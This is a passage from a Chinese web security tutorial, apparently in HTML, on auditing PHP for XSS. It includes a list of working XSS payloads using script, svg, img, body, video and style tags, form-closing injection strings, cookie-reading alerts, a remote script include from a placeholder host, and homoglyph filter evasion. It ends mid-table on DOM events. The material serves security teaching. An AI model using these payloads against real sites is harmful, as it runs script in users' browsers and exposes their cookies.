+PHP&#x4E2D;&#x5E38;&#x89C1;&#x7684;&#x63A5;&#x6536;&#x53C2;&#x6570;&#x7684;&#x65B9;&#x5F0F;&#x6709;$_GET&#x3001;$_POST&#x3001;$_REQUEST&#x7B49;&#x7B49;&#xFF0C;&#x53EF;&#x4EE5;&#x641C;&#x7D22;&#x6240;&#x6709;&#x63A5;&#x6536;&#x53C2;&#x6570;&#x7684;&#x5730;&#x65B9;&#x3002;&#x7136;&#x540E;&#x5BF9;&#x63A5;&#x6536;&#x5230;&#x7684;&#x6570;&#x636E;&#x8FDB;&#x884C;&#x8DDF;&#x8E2A;&#xFF0C;&#x770B;&#x770B;&#x6709;&#x6CA1;&#x6709;&#x8F93;&#x51FA;&#x5230;&#x9875;&#x9762;&#x4E2D;&#xFF0C;&#x7136;&#x540E;&#x770B;&#x8F93;&#x51FA;&#x5230;&#x9875;&#x9762;&#x4E2D;&#x7684;&#x6570;&#x636E;&#x662F;&#x5426;&#x8FDB;&#x884C;&#x4E86;&#x8FC7;&#x6EE4;&#x548C;html&#x7F16;&#x7801;&#x7B49;&#x5904;&#x7406;&#x3002;
+&#x4E5F;&#x53EF;&#x4EE5;&#x641C;&#x7D22;&#x7C7B;&#x4F3C;echo&#x8FD9;&#x6837;&#x7684;&#x8F93;&#x51FA;&#x8BED;&#x53E5;&#xFF0C;&#x8DDF;&#x8E2A;&#x8F93;&#x51FA;&#x7684;&#x53D8;&#x91CF;&#x662F;&#x4ECE;&#x54EA;&#x91CC;&#x6765;&#x7684;&#xFF0C;&#x6211;&#x4EEC;&#x662F;&#x5426;&#x80FD;&#x63A7;&#x5236;&#xFF0C;&#x5982;&#x679C;&#x4ECE;&#x6570;&#x636E;&#x5E93;&#x4E2D;&#x53D6;&#x7684;&#xFF0C;&#x662F;&#x5426;&#x80FD;&#x63A7;&#x5236;&#x5B58;&#x5230;&#x6570;&#x636E;&#x5E93;&#x4E2D;&#x7684;&#x6570;&#x636E;&#xFF0C;&#x5B58;&#x5230;&#x6570;&#x636E;&#x5E93;&#x4E4B;&#x524D;&#x6709;&#x6CA1;&#x6709;&#x8FDB;&#x884C;&#x8FC7;&#x6EE4;&#x7B49;&#x7B49;&#x3002;
+&#x5927;&#x591A;&#x6570;&#x7A0B;&#x5E8F;&#x4F1A;&#x5BF9;&#x63A5;&#x6536;&#x53C2;&#x6570;&#x5C01;&#x88C5;&#x5728;&#x516C;&#x5171;&#x6587;&#x4EF6;&#x7684;&#x51FD;&#x6570;&#x4E2D;&#x7EDF;&#x4E00;&#x8C03;&#x7528;&#xFF0C;&#x6211;&#x4EEC;&#x5C31;&#x9700;&#x8981;&#x5BA1;&#x8BA1;&#x8FD9;&#x4E9B;&#x516C;&#x5171;&#x51FD;&#x6570;&#x770B;&#x6709;&#x6CA1;&#x6709;&#x8FC7;&#x6EE4;&#xFF0C;&#x80FD;&#x5426;&#x7ED5;&#x8FC7;&#x7B49;&#x7B49;&#x3002;
+&#x540C;&#x7406;&#x5BA1;&#x8BA1;DOM&#x578B;&#x6CE8;&#x5165;&#x53EF;&#x4EE5;&#x641C;&#x7D22;&#x4E00;&#x4E9B;js&#x64CD;&#x4F5C;DOM&#x5143;&#x7D20;&#x7684;&#x5173;&#x952E;&#x8BCD;&#x8FDB;&#x884C;&#x5BA1;&#x8BA1;&#x3002;<h2 id="xss-&#x76F8;&#x5173;payload"><a name="xss-&#x76F8;&#x5173;payload" class="anchor-navigation-ex-anchor" href="#xss-&#x76F8;&#x5173;payload"><i class="fa fa-link" aria-hidden="true"></i></a>1.5. XSS &#x76F8;&#x5173;payload</h2>
+xss &#x4E3B;&#x8981;&#x662F;&#x9488;&#x5BF9;&#x6D4F;&#x89C8;&#x5668;&#x5BA2;&#x6237;&#x7AEF;&#x7684;&#x4E00;&#x79CD;&#x653B;&#x51FB;&#xFF0C;&#x90A3;&#x4E48;&#x9700;&#x8981;&#x6267;&#x884C;JavaScript&#x4EE3;&#x7801;&#xFF0C;&#x90A3;&#x4E48;&#x65E0;&#x7591;&#x9700;&#x8981;&#x4F7F;&#x7528;&#x5230;JavaScript&#x8BED;&#x8A00;&#x4EE5;&#x53CA;&#x5728;HTML&#x4E2D;&#x53EF;&#x4EE5;&#x52A0;&#x8F7D;JavaScript&#x7684;&#x6807;&#x7B7E;<h3 id="&#x6807;&#x7B7E;&#x7C7B;"><a name="&#x6807;&#x7B7E;&#x7C7B;" class="anchor-navigation-ex-anchor" href="#&#x6807;&#x7B7E;&#x7C7B;"><i class="fa fa-link" aria-hidden="true"></i></a>1.5.1. &#x6807;&#x7B7E;&#x7C7B;</h3>
+<h4 id="script"><a name="script" class="anchor-navigation-ex-anchor" href="#script"><i class="fa fa-link" aria-hidden="true"></i></a><a name="script" class="anchor-navigation-ex-anchor" href="#script"><i class="fa fa-link" aria-hidden="true"></i></a>script</h4>
+<script></script> &#x6807;&#x7B7E;&#x662F;&#x6700;&#x76F4;&#x63A5;&#x7684;XSS payload&#xFF0C;<script></script>&#x6807;&#x7B7E;&#x53EF;&#x4EE5;&#x5728;&#x6D4F;&#x89C8;&#x5668;&#x6E32;&#x67D3;DOM&#x6811;&#x7684;&#x65F6;&#x5019;&#x540C;&#x6B65;&#x6267;&#x884C;JavaScript&#x4EE3;&#x7801;&#xFF0C;&#x4ED6;&#x53EF;&#x4EE5;&#x5F15;&#x7528;&#x5916;&#x90E8;&#xFF0C;&#x4E5F;&#x53EF;&#x4EE5;&#x5C06;&#x4EE3;&#x7801;&#x63D2;&#x5165;&#x6807;&#x7B7E;&#x5185;<pre class="language-"><code class="lang-html"><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>script</span><span class="token punctuation">&gt;</span></span>alert(&quot;xss&quot;)<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>script</span><span class="token punctuation">&gt;</span></span>
+<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>script</span><span class="token punctuation">&gt;</span></span>alert(/xss/)<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>script</span><span class="token punctuation">&gt;</span></span>
+<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>script</span><span class="token punctuation">&gt;</span></span>alert(1)<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>script</span><span class="token punctuation">&gt;</span></span>
+<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>script</span><span class="token punctuation">&gt;</span></span>alert(document.cookie)<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>script</span><span class="token punctuation">&gt;</span></span>
+<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>script</span> <span class="token attr-name">src</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span>http://xxx.com/xss.js</span><span class="token punctuation">&gt;</span></span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>script</span><span class="token punctuation">&gt;</span></span>
+</code></pre>
+<h4 id="svg"><a name="svg" class="anchor-navigation-ex-anchor" href="#svg"><i class="fa fa-link" aria-hidden="true"></i></a><a name="svg" class="anchor-navigation-ex-anchor" href="#svg"><i class="fa fa-link" aria-hidden="true"></i></a>svg</h4>
+<code><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>svg</span><span class="token punctuation">&gt;</span></span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>svg</span><span class="token punctuation">&gt;</span></span></code>  &#x6807;&#x7B7E;&#x662F;&#x6807;&#x8BB0;&#x5B9A;&#x4E49; SVG &#x56FE;&#x5F62;&#x7684;&#x5BB9;&#x5668;&#xFF0C;&#x5176;&#x5728;onload&#x65B9;&#x6CD5;&#x4E2D;&#x662F;&#x5728; SVG &#x5BB9;&#x5668;&#x521D;&#x59CB;&#x5316;&#x7684;&#x65F6;&#x5019;&#x6267;&#x884C;&#x4EE3;&#x7801;</li>
+</ul>
+<pre class="language-"><code class="lang-html"><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>svg</span> <span class="token attr-name">onload</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">&quot;</span>alert(1)<span class="token punctuation">&quot;</span></span><span class="token punctuation">&gt;</span></span>
+<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>svg</span> <span class="token attr-name">onload</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">&quot;</span>alert(1)<span class="token punctuation">&quot;</span></span><span class="token punctuation">&gt;</span></span>
+</code></pre>
+<h4 id="img"><a name="img" class="anchor-navigation-ex-anchor" href="#img"><i class="fa fa-link" aria-hidden="true"></i></a><a name="img" class="anchor-navigation-ex-anchor" href="#img"><i class="fa fa-link" aria-hidden="true"></i></a>img</h4>
+<p><code><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>img</span> <span class="token punctuation">/&gt;</span></span></code>&#x6807;&#x7B7E;&#x662F;&#x52A0;&#x8F7D;&#x56FE;&#x7247;&#x8D44;&#x6E90;&#x7684;&#x6807;&#x7B7E;&#xFF0C;&#x5176;&#x5728;&#x65E0;&#x6CD5;&#x52A0;&#x8F7D;&#x56FE;&#x7247;&#x8D44;&#x6E90;&#x7684;&#x65F6;&#x5019;&#x4F1A;&#x6267;&#x884C;onerror&#x65B9;&#x6CD5;</p>
+<pre class="language-"><code class="lang-html">&lt;img src=1 &#x3BF;nerr&#x3BF;r=alert(&quot;/xss/&quot;)&gt;
+<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>img</span> <span class="token attr-name">src</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span>1</span> <span class="token attr-name">&#x3BF;nerr&#x3BF;r</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span>alert(document.cookie)</span><span class="token punctuation">&gt;</span></span>
+<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>img</span> <span class="token attr-name">src</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">&quot;</span>&#x6B63;&#x786E;&#x56FE;&#x7247;&#x5730;&#x5740;<span class="token punctuation">&quot;</span></span> <span class="token attr-name">onload</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">&quot;</span>alert(/xss/)<span class="token punctuation">&quot;</span></span> <span class="token punctuation">/&gt;</span></span>
+</code></pre>
+<h4 id="body"><a name="body" class="anchor-navigation-ex-anchor" href="#body"><i class="fa fa-link" aria-hidden="true"></i></a><a name="body" class="anchor-navigation-ex-anchor" href="#body"><i class="fa fa-link" aria-hidden="true"></i></a>body</h4>
+<p><code><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>body</span><span class="token punctuation">&gt;</span></span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>body</span><span class="token punctuation">&gt;</span></span></code> &#x662F;&#x5B9A;&#x4E49;HTML&#x6587;&#x6863;&#x7684;&#x4E3B;&#x4F53;&#x3002;&#x5176;&#x5305;&#x542B;&#x6587;&#x6863;&#x7684;&#x6240;&#x6709;&#x5185;&#x5BB9;&#xFF08;&#x6BD4;&#x5982;&#x6587;&#x672C;&#x3001;&#x8D85;&#x94FE;&#x63A5;&#x3001;&#x56FE;&#x50CF;&#x3001;&#x8868;&#x683C;&#x548C;&#x5217;&#x8868;&#x7B49;&#x7B49;&#x3002;&#xFF09;</p>
+<pre class="language-"><code class="lang-html"><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>body</span> <span class="token attr-name">onload</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span>alert(/xss/)</span><span class="token punctuation">&gt;</span></span>
+<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>body</span> <span class="token attr-name">onpageshow</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span>alert(1)</span><span class="token punctuation">&gt;</span></span>
+</code></pre>
+<h4 id="video"><a name="video" class="anchor-navigation-ex-anchor" href="#video"><i class="fa fa-link" aria-hidden="true"></i></a><a name="video" class="anchor-navigation-ex-anchor" href="#video"><i class="fa fa-link" aria-hidden="true"></i></a>video</h4>
+<p><code><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>video</span><span class="token punctuation">&gt;</span></span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>video</span><span class="token punctuation">&gt;</span></span></code> &#x6807;&#x7B7E;&#x662F;&#x5F15;&#x7528;&#x8FDC;&#x7A0B;&#x5A92;&#x4F53;&#x89C6;&#x9891;&#x7684;&#x6807;&#x7B7E;&#xFF0C;&#x7528;&#x6CD5;&#x4E0E;img&#x7C7B;&#x4F3C;</p>
+<pre class="language-"><code class="lang-html"><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>video</span> <span class="token attr-name">onerror</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">&quot;</span>alert(/xss/)<span class="token punctuation">&quot;</span></span> <span class="token attr-name">src</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">&quot;</span>1<span class="token punctuation">&quot;</span></span><span class="token punctuation">/&gt;</span></span>
+</code></pre>
+<h4 id="style"><a name="style" class="anchor-navigation-ex-anchor" href="#style"><i class="fa fa-link" aria-hidden="true"></i></a><a name="style" class="anchor-navigation-ex-anchor" href="#style"><i class="fa fa-link" aria-hidden="true"></i></a>style</h4>
+<p><code><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>style</span><span class="token punctuation">&gt;</span></span><span class="token style"></span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>style</span><span class="token punctuation">&gt;</span></span></code>&#x6807;&#x7B7E;&#x662F;&#x52A0;&#x8F7D;CSS&#x8D44;&#x6E90;&#x7684;&#x6807;&#x7B7E;</p>
+<pre class="language-"><code class="lang-html"><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>style</span> <span class="token attr-name">&#x3BF;nl&#x3BF;ad</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span>alert(1)</span><span class="token punctuation">&gt;</span></span><span class="token style"></span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>style</span><span class="token punctuation">&gt;</span></span>
+</code></pre>
+<h3 id="&#x8868;&#x5355;&#x7C7B;"><a name="&#x8868;&#x5355;&#x7C7B;" class="anchor-navigation-ex-anchor" href="#&#x8868;&#x5355;&#x7C7B;"><i class="fa fa-link" aria-hidden="true"></i></a>1.5.2. &#x8868;&#x5355;&#x7C7B;</h3>
+<p>&#x5728;web&#x4E2D;&#xFF0C;&#x6700;&#x5E38;&#x89C1;&#x7684;&#x4E3A;&#x8868;&#x5355;&#x4E86;&#xFF0C;&#x8868;&#x5355;&#x4E2D;&#x7684;&#x6807;&#x7B7E;&#x6709;<code><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>input</span> <span class="token punctuation">/&gt;</span></span>&#x3001;<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>textarea</span><span class="token punctuation">&gt;</span></span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>textarea</span><span class="token punctuation">&gt;</span></span></code>&#x7B49;&#x7B49;
+&#x5728;&#x8FD9;&#x91CC;&#x66F4;&#x591A;&#x7684;&#x662F;&#x95ED;&#x5408;&#x8BED;&#x53E5;&#x6765;&#x6784;&#x6210;XSS&#x6BD4;&#x5982;</p>
+<pre class="language-"><code class="lang-html">&quot;/&gt;<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>script</span><span class="token punctuation">&gt;</span></span>alert(/xss/)<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>script</span><span class="token punctuation">&gt;</span></span>
+&gt;<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>textarea</span><span class="token punctuation">&gt;</span></span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>script</span><span class="token punctuation">&gt;</span></span>alert(/xss/)<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>script</span><span class="token punctuation">&gt;</span></span>
+...
+</code></pre>
+<h3 id="&#x4E8B;&#x4EF6;&#x7C7B;"><a name="&#x4E8B;&#x4EF6;&#x7C7B;" class="anchor-navigation-ex-anchor" href="#&#x4E8B;&#x4EF6;&#x7C7B;"><i class="fa fa-link" aria-hidden="true"></i></a>1.5.3. &#x4E8B;&#x4EF6;&#x7C7B;</h3>
+<p>&#x5728;HTML&#x4E2D;&#x6709;&#x8BB8;&#x591A;&#x4E8B;&#x4EF6;&#x64CD;&#x4F5C;&#x7684;&#x65B9;&#x6CD5;&#xFF08;DOM&#x4E8B;&#x4EF6;&#xFF09;&#xFF0C;&#x5982;onclick&#x4E8B;&#x4EF6;&#xFF0C;ondblclick&#x4E8B;&#x4EF6;&#x7B49;&#x7B49;&#xFF0C;&#x53EA;&#x9700;&#x8981;&#x7528;&#x6237;&#x70B9;&#x51FB;&#xFF0C;&#x6216;&#x8005;&#x53CC;&#x51FB;&#x4E5F;&#x53EF;&#x4EE5;&#x6267;&#x884C;JavaScript&#x4EE3;&#x7801;&#xFF0C;&#x5728;&#x8FD9;&#x91CC;&#x5C31;&#x9700;&#x8981;&#x95ED;&#x5408;&#xFF0C;&#x5728;<strong>&#x5757;&#x7EA7;&#x5143;&#x7D20;</strong>&#x4E2D;&#x6DFB;&#x52A0;&#x4E8B;&#x4EF6;&#x65B9;&#x6CD5;&#x3002;
+&#x5E38;&#x89C1;&#x7684;DOM&#x4E8B;&#x4EF6;&#x65B9;&#x6CD5;&#x5982;&#x4E0B;</p>
+<h4 id="&#x9F20;&#x6807;&#x4E8B;&#x4EF6;"><a name="&#x9F20;&#x6807;&#x4E8B;&#x4EF6;" class="anchor-navigation-ex-anchor" href="#&#x9F20;&#x6807;&#x4E8B;&#x4EF6;"><i class="fa fa-link" aria-hidden="true"></i></a><a name="&#x9F20;&#x6807;&#x4E8B;&#x4EF6;" class="anchor-navigation-ex-anchor" href="#&#x9F20;&#x6807;&#x4E8B;&#x4EF6;"><i class="fa fa-link" aria-hidden="true"></i></a>&#x9F20;&#x6807;&#x4E8B;&#x4EF6;</h4>
+<table>
+<thead>
+<tr>
+<th>&#x5C5E;&#x6027;</th>
+<th>&#x63CF;&#x8FF0;</th>
+<th>DOM</th>
+</tr>
+</thead>
+<tbody>
+<tr>
+<td><a href="https://www.runoob.com/jsref/event-onclick.html" target="_blank">onclick</a></td>
+<td>&#x5F53;&#x7528;&#x6237;&#x70B9;&#x51FB;&#x67D0;&#x4E2A;&#x5BF9;&#x8C61;&#x65F6;&#x8C03;&#x7528;&#x7684;&#x4E8B;&#x4EF6;&#x53E5;&#x67C4;&#x3002;</td>
+<td>2</td>
+</tr>
+<tr>
+<td><a href="https://www.runoob.com/jsref/event-oncontextmenu.html" target="_blank">oncontextmenu</a></td>
+<td>&#x5728;&#x7528;&#x6237;&#x70B9;&#x51FB;&#x9F20;&#x6807;&#x53F3;&#x952E;&#x6253;&#x5F00;&#x4E0A;&#x4E0B;&#x6587;&#x83DC;&#x5355;&#x65F6;&#x89E6;&#x53D1;</td>
+<td></td>
+</tr>
+<tr>
+<td><a href="https://www.runoob.com/jsref/event-ondblclick.html" target="_blank">ondblclick</a></td>
+<td>&#x5F53;&#x7528;&#x6237;&#x53CC;&#x51FB;&#x67D0;&#x4E2A;&#x5BF9;&#x8C61;&#x65F6;&#x8C03;&#x7528;&#x7684;&#x4E8B;&#x4EF6;&#x53E5;&#x67C4;&#x3002;</td>
+<td>2</td>
+</tr>
+<tr>
+<td><a href="https://www.runoob.com/jsref/event-onmousedown.html" target="_blank">onmousedown</a></td>
+<td>&#x9F20;&#x6807;&#x6309;&#x94AE;&#x88AB;&#x6309;&#x4E0B;&#x3002;</td>
+<td>2</td>
+</tr>
+<tr>
+<td><a href="https://www.runoob.com/jsref/event-onmouseenter.html" target="_blank">onmouseenter</a></td>
+<td>&#x5F53;&#x9F20;&#x6807;&#x6307;&#x9488;&#x79FB;&#x52A8;&#x5230;&#x5143;&#x7D20;&#x4E0A;&#x65F6;&#x89E6;&#x53D1;&#x3002;</td>
+<td>2</td>
+</tr>
+<tr>
+<td><a href="https://www.runoob.com/jsref/event-onmouseleave.html" target="_blank">onmouseleave</a></td>
+<td>&#x5F53;&#x9F20;&#x6807;&#x6307;&#x9488;&#x79FB;&#x51FA;&#x5143;&#x7D20;&#x65F6;&#x89E6;&#x53D1;</td>
+<td>2</td>
+</tr>
+<tr>
+<td><a href="https://www.runoob.com/jsref/event-onmousemove.html" target="_blank">onmousemove</a></td>
+<td>&#x9F20;&#x6807;&#x88AB;&#x79FB;&#x52A8;&#x3002;</td>
+<td>2</td>
+</tr>
+<tr>
+<td><a href="https://www.runoob.com/jsref/event-onmouseover.html" target="_blank">onmouseover</a></td>
+<td>&#x9F20;&#x6807;&#x79FB;&#x5230;&#x67D0;&#x5143;&#x7D20;&#x4E4B;&#x4E0A;&#x3002;</td>
+<td>2</td>
+</tr>
+<tr>
+<td><a href="https://www.runoob.com/jsref/event-onmouseout.html" target="_blank">onmouseout</a></td>
+<td>&#x9F20;&#x6807;&#x4ECE;&#x67D0;&#x5143;&#x7D20;&#x79FB;&#x5F00;&#x3002;</td>
+<td>2</td>
+</tr>
+<tr>
+<td><a href="https://www.runoob.com/jsref/event-onmouseup.html" target="_blank">onmouseup</a></td>
+<td>&#x9F20;&#x6807;&#x6309;&#x952E;&#x88AB;&#x677E;&#x5F00;&#x3002;</td>
+<td>2</td>
+</tr>
+</tbody>
+</table>
+<h4 id="&#x952E;&#x76D8;&#x4E8B;&#x4EF6;"><a name="&#x952E;&#x76D8;&#x4E8B;&#x4EF6;" class="anchor-navigation-ex-anchor" href="#&#x952E;&#x76D8;&#x4E8B;&#x4EF6;"><i class="fa fa-link" aria-hidden="true"></i></a><a name="&#x952E;&#x76D8;&#x4E8B;&#x4EF6;" class="anchor-navigation-ex-anchor" href="#&#x952E;&#x76D8;&#x4E8B;&#x4EF6;"><i class="fa fa-link" aria-hidden="true"></i></a>&#x952E;&#x76D8;&#x4E8B;&#x4EF6;</h4>
+<table>
+<thead>
+<tr>
+<th>&#x5C5E;&#x6027;</th>
+<th>&#x63CF;&#x8FF0;</th>
+<th>DOM</th>
+</tr>
+</thead>
+<tbody>
+<tr>
+<td><a href="https://www.runoob.com/jsref/event-onkeydown.html" target="_blank">onkeydown</a></td>
+<td>&#x67D0;&#x4E2A;&#x952E;&#x76D8;&#x6309;&#x952E;&#x88AB;&#x6309;&#x4E0B;&#x3002;</td>
+<td>2</td>
+</tr>
+<tr>
+<td><a href="https://www.runoob.com/jsref/event-onkeypress.html" target="_blank">onkeypress</a></td>
+<td>&#x67D0;&#x4E2A;&#x952E;&#x76D8;&#x6309;&#x952E;&#x88AB;&#x6309;&#x4E0B;&#x5E76;&#x677E;&#x5F00;&#x3002;</td>
+<td>2</td>
+</tr>
+<tr>
+<td><a href="https://www.runoob.com/jsref/event-onkeyup.html" target="_blank">onkeyup</a></td>
+<td>&#x67D0;&#x4E2A;&#x952E;&#x76D8;&#x6309;&#x952E;&#x88AB;&#x677E;&#x5F00;&#x3002;</td>
+<td>2</td>
+</tr>
+</tbody>
+</table>
+<h4 id="&#x6846;&#x67B6;&#x5BF9;&#x8C61;&#xFF08;frameobject&#xFF09;&#x4E8B;&#x4EF6;"><a name="&#x6846;&#x67B6;&#x5BF9;&#x8C61;&#xFF08;frameobject&#xFF09;&#x4E8B;&#x4EF6;" class="anchor-navigation-ex-anchor" href="#&#x6846;&#x67B6;&#x5BF9;&#x8C61;&#xFF08;frameobject&#xFF09;&#x4E8B;&#x4EF6;"><i class="fa fa-link" aria-hidden="true"></i></a><a name="&#x6846;&#x67B6;&#x5BF9;&#x8C61;&#xFF08;frameobject&#xFF09;&#x4E8B;&#x4EF6;" class="anchor-navigation-ex-anchor" href="#&#x6846;&#x67B6;&#x5BF9;&#x8C61;&#xFF08;frameobject&#xFF09;&#x4E8B;&#x4EF6;"><i class="fa fa-link" aria-hidden="true"></i></a>&#x6846;&#x67B6;/&#x5BF9;&#x8C61;&#xFF08;Frame/Object&#xFF09;&#x4E8B;&#x4EF6;</h4>
+<table>
+<thead>
+<tr>
+<th>&#x5C5E;&#x6027;</th>
+<th>&#x63CF;&#x8FF0;</th>
+<th>DOM</th>
+</tr>
+</thead>
+<tbody>
+<tr>
+<td><a href="https://www.runoob.com/jsref/event-onabort.html" target="_blank">onabort</a></td>
+<td>&#x56FE;&#x50CF;&#x7684;&#x52A0;&#x8F7D;&#x88AB;&#x4E2D;&#x65AD;&#x3002; ( <code><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>object</span><span class="token punctuation">&gt;</span></span></code>)</td>
+<td>2</td>
+</tr>
+<tr>
+<td><a href="https://www.runoob.com/jsref/event-onbeforeunload.html" target="_blank">onbeforeunload</a></td>
+<td>&#x8BE5;&#x4E8B;&#x4EF6;&#x5728;&#x5373;&#x5C06;&#x79BB;&#x5F00;&#x9875;&#x9762;&#xFF08;&#x5237;&#x65B0;&#x6216;&#x5173;&#x95ED;&#xFF09;&#x65F6;&#x89E6;&#x53D1;</td>
+<td>2</td>
+</tr>
+<tr>
+<td><a href="https://www.runoob.com/jsref/event-onerror.html" target="_blank">onerror</a></td>
+<td>&#x5728;&#x52A0;&#x8F7D;&#x6587;&#x6863;&#x6216;&#x56FE;&#x50CF;&#x65F6;&#x53D1;&#x751F;&#x9519;&#x8BEF;&#x3002; ( <code><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>object</span><span class="token punctuation">&gt;</span></span>, <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>body</span><span class="token punctuation">&gt;</span></span></code>&#x548C; <code><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>frameset</span><span class="token punctuation">&gt;</span></span></code>)</td>
+<td></td>
+</tr>
+<tr>
+<td><a href="https://www.runoob.com/jsref/event-onhashchange.html" target="_blank">onhashchange</a></td>
+<td>&#x8BE5;&#x4E8B;&#x4EF6;&#x5728;&#x5F53;&#x524D; URL &#x7684;&#x951A;&#x90E8;&#x5206;&#x53D1;&#x751F;&#x4FEE;&#x6539;&#x65F6;&#x89E6;&#x53D1;&#x3002;</td>
+<td></td>
+</tr>
+<tr>
+<td><a href="https://www.runoob.com/jsref/event-onload.html" target="_blank">onload</a></td>
+<td>&#x4E00;&#x5F20;&#x9875;&#x9762;&#x6216;&#x4E00;&#x5E45;&#x56FE;&#x50CF;&#x5B8C;&#x6210;&#x52A0;&#x8F7D;&#x3002;</td>
+<td>2</td>
+</tr>
+<tr>
+<td><a href="https://www.runoob.com/jsref/event-onpageshow.html" target="_blank">onpageshow</a></td>
+<td>&#x8BE5;&#x4E8B;&#x4EF6;&#x5728;&#x7528;&#x6237;&#x8BBF;&#x95EE;&#x9875;&#x9762;&#x65F6;&#x89E6;&#x53D1;</td>
+<td></td>
+</tr>
+<tr>
+<td><a href="https://www.runoob.com/jsref/event-onpagehide.html" target="_blank">onpagehide</a></td>
+<td>&#x8BE5;&#x4E8B;&#x4EF6;&#x5728;&#x7528;&#x6237;&#x79BB;&#x5F00;&#x5F53;&#x524D;&#x7F51;&#x9875;&#x8DF3;&#x8F6C;&#x5230;&#x53E6;&#x5916;&#x4E00;&#x4E2A;&#x9875;&#x9762;&#x65F6;&#x89E6;&#x53D1;</td>
+<td></td>
+</tr>
+<tr>
+<td><a href="https://www.runoob.com/jsref/event-onresize.html" target="_blank">onresize</a></td>
+<td>&#x7A97;&#x53E3;&#x6216;&#x6846;&#x67B6;&#x88AB;&#x91CD;&#x65B0;&#x8C03;&#x6574;&#x5927;&#x5C0F;&#x3002;</td>
+<td>2</td>
+</tr>
+<tr>
+<td><a href="https://www.runoob.com/jsref/event-onscroll.html" target="_blank">onscroll</a></td>
+<td>&#x5F53;&#x6587;&#x6863;&#x88AB;&#x6EDA;&#x52A8;&#x65F6;&#x53D1;&#x751F;&#x7684;&#x4E8B;&#x4EF6;&#x3002;</td>
+<td>2</td>
+</tr>
+<tr>
+<td><a href="https://www.runoob.com/jsref/event-onunload.html" target="_blank">onunload</a></td>
+<td>&#x7528;&#x6237;&#x9000;&#x51FA;&#x9875;&#x9762;&#x3002; ( <code><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>body</span><span class="token punctuation">&gt;</span></span></code> &#x548C; <code><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>frameset</span><span class="token punctuation">&gt;</span></span></code>)</td>
+<td>2</td>
+</tr>
+</tbody>
+</table>
+<h4 id="&#x8868;&#x5355;&#x4E8B;&#x4EF6;"><a name="&#x8868;&#x5355;&#x4E8B;&#x4EF6;" class="anchor-navigation-ex-anchor" href="#&#x8868;&#x5355;&#x4E8B;&#x4EF6;"><i class="fa fa-link" aria-hidden="true"></i></a><a name="&#x8868;&#x5355;&#x4E8B;&#x4EF6;" class="anchor-navigation-ex-anchor" href="#&#x8868;&#x5355;&#x4E8B;&#x4EF6;"><i class="fa fa-link" aria-hidden="true"></i></a>&#x8868;&#x5355;&#x4E8B;&#x4EF6;</h4>
+<table>
+<thead>
+<tr>
+<th>&#x5C5E;&#x6027;</th>
+<th>&#x63CF;&#x8FF0;</th>
+<th>DOM</th>
+</tr>
+</thead>
+<tbody>
+<tr>
+<td><a href="https://www.runoob.com/jsref/event-onblur.html" target="_blank">onblur</a></td>
+<td>&#x5143;&#x7D20;&#x5931;&#x53BB;&#x7126;&#x70B9;&#x65F6;&#x89E6;&#x53D1;</td>
+<td>2</td>
+</tr>
+<tr>
+<td><a href="https://www.runoob.com/jsref/event-onchange.html" target="_blank">onchange</a></td>
